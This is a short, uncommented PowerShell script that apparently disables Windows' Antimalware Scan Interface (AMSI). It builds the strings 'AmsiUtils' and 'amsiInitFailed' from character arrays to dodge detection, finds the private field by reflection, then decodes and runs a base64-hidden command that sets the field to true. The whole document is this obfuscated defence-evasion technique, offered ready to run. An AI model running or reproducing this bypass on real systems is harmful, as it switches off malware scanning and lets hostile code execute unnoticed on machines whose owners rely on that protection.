$types = [Ref].Assembly.GetTypes()

$x = @('A','m','s','i','U','t','i','l','s')

$y = @('a','m','s','i','I','n','i','t','F','a','i','l','e','d')

$s = $x -join ''

$s1 = $y -join ''

foreach($type in $types)
{
    if ($type.Name -like $s)
    {
        $fields = $type.GetFields('NonPublic,Static')

        foreach($field in $fields)
        {
            if ($field.Name -like $s1)
            {
                $f = $field

                $decodedBytes = [System.Convert]::FromBase64String("JABmAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAIAAkAHQAcgB1AGUAKQA=")

                $decodedCommand = [System.Text.Encoding]::Unicode.GetString($decodedBytes)

                Invoke-Expression $decodedCommand
            }
        }
    }
}
